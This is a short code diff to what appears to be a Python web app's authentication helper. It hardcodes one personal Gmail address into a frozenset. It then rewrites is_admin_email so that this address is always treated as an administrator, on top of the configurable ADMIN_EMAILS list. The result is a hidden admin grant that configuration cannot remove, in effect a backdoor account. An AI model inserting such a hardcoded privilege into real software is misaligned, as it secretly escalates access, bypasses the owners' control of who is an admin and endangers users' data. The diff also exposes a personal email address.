@@ -33,10 +33,14 @@ def get_optional_user(
     return db.scalar(select(User).where(User.api_token == token))
 
 
+HARDCODED_ADMIN_EMAILS = frozenset({"lxk955@gmail.com"})
+
+
 def is_admin_email(email: str | None) -> bool:
     if not email:
         return False
-    allowed = {e.strip().lower() for e in settings.ADMIN_EMAILS.split(",") if e.strip()}
+    allowed = set(HARDCODED_ADMIN_EMAILS)
+    allowed.update(e.strip().lower() for e in settings.ADMIN_EMAILS.split(",") if e.strip())
     return email.strip().lower() in allowed
 
 
